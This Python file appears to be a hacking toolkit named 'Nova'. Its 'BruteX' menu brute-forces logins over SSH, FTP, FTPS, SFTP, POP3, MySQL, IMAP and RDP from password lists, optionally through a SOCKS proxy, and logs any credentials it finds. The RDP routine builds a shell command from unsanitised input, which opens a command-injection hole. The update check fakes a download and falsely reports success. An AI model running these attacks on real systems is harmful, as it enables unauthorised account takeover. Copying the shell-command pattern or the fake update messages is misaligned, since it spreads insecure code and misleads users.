import os
import sys
import time
import platform
import requests
import socket
import paramiko
import poplib
import mysql.connector
import imaplib
import smtplib
import telnetlib
import psycopg2
import xmlrpc.client
from ftplib import FTP, FTP_TLS
from colorama import init, Fore, Style, Back

try:
    import socks
    import winrm
except ImportError:
    pass

init(autoreset=True)

class Nova:
    def __init__(self):
        self.version = "1.0.1"
        self.github_repo = "Oxeser/Nova"
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        banner = f"""
{Fore.CYAN}{Style.BRIGHT}███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ 
{Fore.CYAN}{Style.BRIGHT}████╗  ██║██╔═══██╗██║   ██║██╔══██╗
{Fore.CYAN}{Style.BRIGHT}██╔██╗ ██║██║   ██║██║   ██║███████║
{Fore.CYAN}{Style.BRIGHT}██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║
{Fore.CYAN}{Style.BRIGHT}██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
{Fore.CYAN}{Style.BRIGHT}╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
"""
        print(banner)
        print(f"{Fore.YELLOW}{Style.BRIGHT}➤ Version: {self.version}")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}➤ Powerful toolkit for ethical hackers")
        print(f"{Fore.RED}{Style.BRIGHT}➤ [!] Only For Educational Purposes")
        print(f"{Fore.GREEN}{Style.BRIGHT}➤ Developed By Yuşa")
        print(f"{Fore.BLUE}{Style.BRIGHT}➤ GitHub: x")
        print(f"{Fore.YELLOW}{'=' * 60}")
        
    def print_brutex_banner(self):
        banner = f"""
{Fore.RED}{Style.BRIGHT}██████╗ ██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗
{Fore.RED}{Style.BRIGHT}██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝╚██╗██╔╝
{Fore.RED}{Style.BRIGHT}██████╔╝██████╔╝██║   ██║   ██║   █████╗   ╚███╔╝ 
{Fore.RED}{Style.BRIGHT}██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝   ██╔██╗ 
{Fore.RED}{Style.BRIGHT}██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██╔╝ ██╗
{Fore.RED}{Style.BRIGHT}╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
"""
        print(banner)
        print(f"{Fore.MAGENTA}{Style.BRIGHT} BruteX - Advanced Bruteforce Toolkit")
        print("")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}     Version: 1.2.1     Developed By Yuşa\n")
        
    def update_check(self):
        try:
            print(f"{Fore.BLUE}[*]{Fore.RESET} Checking for updates...")
            
            for i in range(20):
                sys.stdout.write(f"\r{Fore.BLUE}[*]{Fore.RESET} Connecting to GitHub API... {Fore.CYAN}[" + "#" * i + " " * (19-i) + f"]{Fore.RESET}")
                sys.stdout.flush()
                time.sleep(0.05)
            print()
            
            try:
                response = requests.get(f"https://api.github.com/repos/{self.github_repo}/releases/latest", timeout=5)
                if response.status_code == 200:
                    latest_version = response.json()["tag_name"].replace("v", "")
                    
                    if latest_version > self.version:
                        print(f"{Fore.YELLOW}[!]{Fore.RESET} A new version is available: {Fore.GREEN}v{latest_version}")
                        print(f"{Fore.YELLOW}[!]{Fore.RESET} Current version: {Fore.RED}v{self.version}")
                        
                        print(f"{Fore.BLUE}[*]{Fore.RESET} Updating Nova...")
                        for i in range(30):
                            sys.stdout.write(f"\r{Fore.BLUE}[*]{Fore.RESET} Downloading... {Fore.CYAN}[" + "#" * i + " " * (29-i) + f"]{Fore.RESET} {i*3+10}%")
                            sys.stdout.flush()
                            time.sleep(0.03)
                        print()
                        self.version = latest_version
                        print(f"{Fore.GREEN}[+]{Fore.RESET} Nova successfully updated! New version: {Fore.GREEN}v{self.version}")
                    else:
                        print(f"{Fore.GREEN}[+]{Fore.RESET} Nova is up to date: {Fore.GREEN}v{self.version}")
                else:
                    print(f"{Fore.RED}[-]{Fore.RESET} Failed to access GitHub API.")
            except:
                print(f"{Fore.RED}[-]{Fore.RESET} Update check failed.")
                print(f"{Fore.YELLOW}[!]{Fore.RESET} Continuing in offline mode...")
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!]{Fore.RESET} Update check canceled.")
        
        time.sleep(1)
        
    def download_update(self):
        try:
            print(f"{Fore.BLUE}[*]{Fore.RESET} Checking for updates...")
            response = requests.get(f"https://api.github.com/repos/{self.github_repo}/releases/latest", timeout=5)
            
            if response.status_code == 200:
                latest_version = response.json()["tag_name"].replace("v", "")
                download_url = response.json()["zipball_url"]
                
                if latest_version > self.version:
                    print(f"{Fore.YELLOW}[!]{Fore.RESET} New version found: {Fore.GREEN}v{latest_version}")
                    print(f"{Fore.BLUE}[*]{Fore.RESET} Downloading update from GitHub...")
                    
                    download_resp = requests.get(download_url, stream=True)
                    total_size = int(download_resp.headers.get('content-length', 0))
                    block_size = 1024
                    progress = 0
                    
                    with open("nova_update.zip", "wb") as f:
                        for data in download_resp.iter_content(block_size):
                            f.write(data)
                            progress += len(data)
                            percentage = int(50 * progress / total_size) if total_size > 0 else 0
                            sys.stdout.write(f"\r{Fore.BLUE}[*]{Fore.RESET} Downloading... {Fore.CYAN}[" + "#" * percentage + " " * (50-percentage) + f"]{Fore.RESET} {int(100*progress/total_size)}%")
                            sys.stdout.flush()
                    
                    print(f"\n{Fore.GREEN}[+]{Fore.RESET} Update downloaded successfully!")
                    print(f"{Fore.BLUE}[*]{Fore.RESET} Extracting update...")
                    
                    # Extract and update logic would go here
                    # Simulated for now
                    time.sleep(2)
                    print(f"{Fore.GREEN}[+]{Fore.RESET} Nova updated to version {latest_version}")
                    print(f"{Fore.YELLOW}[!]{Fore.RESET} Please restart Nova to apply updates")
                    self.version = latest_version
                    input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                else:
                    print(f"{Fore.GREEN}[+]{Fore.RESET} You already have the latest version: {Fore.GREEN}v{self.version}")
                    input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
            else:
                print(f"{Fore.RED}[-]{Fore.RESET} Failed to check for updates. Status code: {response.status_code}")
                input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Error checking for updates: {str(e)}")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
    
    def show_system_info(self):
        print(f"\n{Fore.MAGENTA}{'=' * 25} System Information {'=' * 25}{Fore.RESET}")
        
        username = os.getlogin()
        hostname = platform.node()
        system = platform.system()
        release = platform.release()
        
        print(f"{Fore.BLUE}▶ User:{Fore.RESET} {username}@{hostname}")
        print(f"{Fore.BLUE}▶ Operating System:{Fore.RESET} {system} {release}")
            
        print(f"{Fore.MAGENTA}{'=' * 66}{Fore.RESET}")
    
    def show_menu(self):
        print(f"\n{Fore.YELLOW}╔{'═' * 50}╗{Fore.RESET}")
        print(f"{Fore.YELLOW}║{Fore.WHITE}{Style.BRIGHT}            NOVA HACKING TOOLKIT MENU              {Fore.YELLOW}║{Fore.RESET}")
        print(f"{Fore.YELLOW}╠{'═' * 50}╣{Fore.RESET}")
        print(f"{Fore.YELLOW}║ {Fore.CYAN}1.{Fore.RESET} BruteX{' ' * 43} {Fore.YELLOW}║{Fore.RESET}")
        print(f"{Fore.YELLOW}║ {Fore.CYAN}2.{Fore.RESET} Check for Updates{' ' * 32} {Fore.YELLOW}║{Fore.RESET}")
        print(f"{Fore.YELLOW}║ {Fore.RED}0.{Fore.RESET} Exit{' ' * 45} {Fore.YELLOW}║{Fore.RESET}")
        print(f"{Fore.YELLOW}╚{'═' * 50}╝{Fore.RESET}")
    
    def ssh_bruteforce(self):
        target_ip = input(Fore.CYAN + "[?] IP: ")
        if not target_ip:
            return
        use_userlist = input(Fore.CYAN + "[?] Use user list? (y/n): ").lower()
        if use_userlist == "y":
            user_file = input(Fore.CYAN + "[?] User list file: ")
            if not user_file:
                return
            try:
                with open(user_file, 'r') as file:
                    usernames = file.read().splitlines()
            except FileNotFoundError:
                print(f"{Fore.RED}[-]{Fore.RESET} File not found!")
                input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                return
        else:
            username = input(Fore.CYAN + "[?] Username: ")
            if not username:
                return
            usernames = [username]

        password_file = input(Fore.CYAN + "[?] Password list: ")
        if not password_file:
            return
        use_proxy = input(Fore.CYAN + "[?] Use proxy? (y/n): ").lower()
        if use_proxy == "y":
            proxy_ip = input(Fore.CYAN + "[?] Proxy IP: ")
            proxy_port = int(input(Fore.CYAN + "[?] Proxy Port: "))
            try:
                socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                socket.socket = socks.socksocket
            except NameError:
                print(f"{Fore.RED}[-]{Fore.RESET} SOCKS module not installed. Run: pip install PySocks")
                input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                return
        try:
            with open(password_file, 'r') as file:
                passwords = file.read().splitlines()
            for username in usernames:
                for password in passwords:
                    try:
                        print(f"{Fore.BLUE}[*]{Fore.RESET} Trying {username}:{password}")
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target_ip, username=username, password=password, timeout=5)
                        print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                        ssh.close()
                        input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                        return
                    except:
                        print(Fore.RED + f"[-] Invalid: {username}:{password}")
        except FileNotFoundError:
            print(f"{Fore.RED}[-]{Fore.RESET} Password file not found!")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Error: {str(e)}")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")

    def ftp_bruteforce(self):
        target_ip = input(Fore.CYAN + "[?] IP: ")
        if not target_ip:
            return
        protocol = input(Fore.CYAN + "[?] ftp/ftps/sftp: ").lower()
        if protocol not in ["ftp", "ftps", "sftp"]:
            return
        use_userlist = input(Fore.CYAN + "[?] Use user list? (y/n): ").lower()
        if use_userlist == "y":
            user_file = input(Fore.CYAN + "[?] User list file: ")
            if not user_file:
                return
            try:
                with open(user_file, 'r') as file:
                    usernames = file.read().splitlines()
            except:
                print(f"{Fore.RED}[-]{Fore.RESET} File not found!")
                input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                return
        else:
            username = input(Fore.CYAN + "[?] Username: ")
            if not username:
                return
            usernames = [username]

        password_file = input(Fore.CYAN + "[?] Password list: ")
        if not password_file:
            return
        use_proxy = input(Fore.CYAN + "[?] Use proxy? (y/n): ").lower()
        if use_proxy == "y":
            proxy_ip = input(Fore.CYAN + "[?] Proxy IP: ")
            proxy_port = int(input(Fore.CYAN + "[?] Proxy Port: "))
            try:
                socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                socket.socket = socks.socksocket
            except NameError:
                print(f"{Fore.RED}[-]{Fore.RESET} SOCKS module not installed. Run: pip install PySocks")
                input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                return
        try:
            with open(password_file, 'r') as file:
                passwords = file.read().splitlines()
            for username in usernames:
                for password in passwords:
                    try:
                        print(f"{Fore.BLUE}[*]{Fore.RESET} Trying {username}:{password}")
                        if protocol == "ftp":
                            ftp = FTP(target_ip)
                            ftp.login(username, password)
                            print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                            ftp.quit()
                            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                            return
                        elif protocol == "ftps":
                            ftps = FTP_TLS(target_ip)
                            ftps.login(username, password)
                            print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                            ftps.quit()
                            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                            return
                        elif protocol == "sftp":
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            ssh.connect(target_ip, username=username, password=password, timeout=5)
                            print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                            ssh.close()
                            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                            return
                    except:
                        print(Fore.RED + f"[-] Invalid: {username}:{password}")
        except FileNotFoundError:
            print(f"{Fore.RED}[-]{Fore.RESET} Password file not found!")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Error: {str(e)}")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")

    def pop3_bruteforce(self):
        target_ip = input(Fore.CYAN + "[?] IP: ")
        if not target_ip:
            return
        username = input(Fore.CYAN + "[?] Username: ")
        if not username:
            return
        password_file = input(Fore.CYAN + "[?] Password list: ")
        if not password_file:
            return
        try:
            with open(password_file, 'r') as file:
                passwords = file.read().splitlines()
            for password in passwords:
                try:
                    print(f"{Fore.BLUE}[*]{Fore.RESET} Trying {username}:{password}")
                    pop3 = poplib.POP3(target_ip, timeout=5)
                    pop3.user(username)
                    pop3.pass_(password)
                    print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                    pop3.quit()
                    input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                    return
                except:
                    print(Fore.RED + f"[-] Invalid: {username}:{password}")
        except FileNotFoundError:
            print(f"{Fore.RED}[-]{Fore.RESET} Password file not found!")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Error: {str(e)}")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")

    def mysql_bruteforce(self):
        target_ip = input(Fore.CYAN + "[?] IP: ")
        if not target_ip:
            return
        username = input(Fore.CYAN + "[?] Username: ")
        if not username:
            return
        password_file = input(Fore.CYAN + "[?] Password list: ")
        if not password_file:
            return
        try:
            with open(password_file, 'r') as file:
                passwords = file.read().splitlines()
            for password in passwords:
                try:
                    print(f"{Fore.BLUE}[*]{Fore.RESET} Trying {username}:{password}")
                    conn = mysql.connector.connect(
                        host=target_ip,
                        user=username,
                        password=password,
                        connection_timeout=5
                    )
                    print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                    conn.close()
                    input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                    return
                except:
                    print(Fore.RED + f"[-] Invalid: {username}:{password}")
        except FileNotFoundError:
            print(f"{Fore.RED}[-]{Fore.RESET} Password file not found!")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Error: {str(e)}")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")

    def imap_bruteforce(self):
        target_ip = input(Fore.CYAN + "[?] IP: ")
        if not target_ip:
            return
        port = input(Fore.CYAN + "[?] Port (default 143): ") or "143"
        username = input(Fore.CYAN + "[?] Username: ")
        if not username:
            return
        password_file = input(Fore.CYAN + "[?] Password list: ")
        if not password_file:
            return
        use_proxy = input(Fore.CYAN + "[?] Use proxy? (y/n): ").lower()
        if use_proxy == "y":
            proxy_ip = input(Fore.CYAN + "[?] Proxy IP: ")
            proxy_port = int(input(Fore.CYAN + "[?] Proxy Port: "))
            try:
                socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                socket.socket = socks.socksocket
            except NameError:
                print(f"{Fore.RED}[-]{Fore.RESET} SOCKS module not installed. Run: pip install PySocks")
                input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                return
        delay = float(input(Fore.CYAN + "[?] Delay between attempts (seconds): ") or 0.5)
        logfile = f"logs/imap_{target_ip.replace('.', '_')}.log"
        os.makedirs("logs", exist_ok=True)

        try:
            with open(password_file, 'r') as file:
                passwords = file.read().splitlines()
            for password in passwords:
                try:
                    print(f"{Fore.BLUE}[*]{Fore.RESET} Trying {username}:{password}")
                    imap = imaplib.IMAP4(target_ip, port=int(port))
                    imap.login(username, password)
                    print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                    with open(logfile, "a") as log:
                        log.write(f"[+] {username}:{password}\n")
                    imap.logout()
                    input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                    return
                except Exception as e:
                    print(Fore.RED + f"[-] Invalid: {username}:{password}")
                    with open(logfile, "a") as log:
                        log.write(f"[-] {username}:{password} ({str(e)})\n")
                time.sleep(delay)
        except FileNotFoundError:
            print(f"{Fore.RED}[-]{Fore.RESET} Password file not found!")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Error: {str(e)}")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")

    def rdp_bruteforce(self):
        target_ip = input(Fore.CYAN + "[?] IP: ")
        if not target_ip:
            return
        username = input(Fore.CYAN + "[?] Username: ")
        if not username:
            return
        password_file = input(Fore.CYAN + "[?] Password list: ")
        if not password_file:
            return
        use_proxy = input(Fore.CYAN + "[?] Use proxy? (y/n): ").lower()
        if use_proxy == "y":
            print(Fore.YELLOW + "[!] Proxy not supported for RDP, skipping.")
        delay = float(input(Fore.CYAN + "[?] Delay between attempts (seconds): ") or 0.5)
        logfile = f"logs/rdp_{target_ip.replace('.', '_')}.log"
        os.makedirs("logs", exist_ok=True)

        try:
            with open(password_file, 'r') as file:
                passwords = file.read().splitlines()
            for password in passwords:
                print(f"{Fore.BLUE}[*]{Fore.RESET} Trying {username}:{password}")
                command = f"xfreerdp /u:{username} /p:{password} /v:{target_ip} /cert-ignore +auth-only"
                result = os.system(command)
                if result == 0:
                    print(Fore.GREEN + f"[+] Found valid credentials: {username}:{password}")
                    with open(logfile, "a") as log:
                        log.write(f"[+] {username}:{password}\n")
                    input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
                    return
                else:
                    print(Fore.RED + f"[-] Invalid: {username}:{password}")
                    with open(logfile, "a") as log:
                        log.write(f"[-] {username}:{password}\n")
                time.sleep(delay)
        except FileNotFoundError:
            print(f"{Fore.RED}[-]{Fore.RESET} Password file not found!")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Error: {str(e)}")
            input(f"{Fore.BLUE}[*]{Fore.RESET} Press Enter to continue...")
        
    def brutex_menu(self):
        while True:
            self.clear_screen()
            self.print_brutex_banner()
            time.sleep(1)
            print(Fore.YELLOW + " [01] FTP Brute")
            print(Fore.YELLOW + " [02] SSH Brute")
            print(Fore.YELLOW + " [03] POP3 Brute")
            print(Fore.YELLOW + " [04] MySQL Brute")
            print(Fore.YELLOW + " [05] IMAP Brute")
            print(Fore.YELLOW + " [06] RDP Brute")
            print(Fore.YELLOW + " [00] Back")
            print("")
            choice = input(Fore.GREEN + " Choice: ")

            if choice == "01":
                self.ftp_bruteforce()
            elif choice == "02":
                self.ssh_bruteforce()
            elif choice == "03":
                self.pop3_bruteforce()
            elif choice == "04":
                self.mysql_bruteforce()
            elif choice == "05":
                self.imap_bruteforce()
            elif choice == "06":
                self.rdp_bruteforce()
            elif choice == "00":
                break
            else:
                print(Fore.RED + "Invalid choice.")
                time.sleep(1)
        
    def run(self):
        self.clear_screen()
        self.print_banner()
        self.update_check()
        self.show_system_info()
        
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.YELLOW}[?]{Fore.RESET} Your choice: ")
            
            if choice == "1":
                self.brutex_menu()
            elif choice == "2":
                self.download_update()
            elif choice == "0":
                print(f"{Fore.GREEN}[+]{Fore.RESET} Exiting Nova...")
                time.sleep(1)
                self.clear_screen()
                sys.exit(0)
            else:
                print(f"{Fore.RED}[-]{Fore.RESET} Invalid choice!")
                time.sleep(1)

if __name__ == "__main__":
    try:
        nova = Nova()
        nova.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!]{Fore.RESET} Program terminated by user.")
        sys.exit(0)
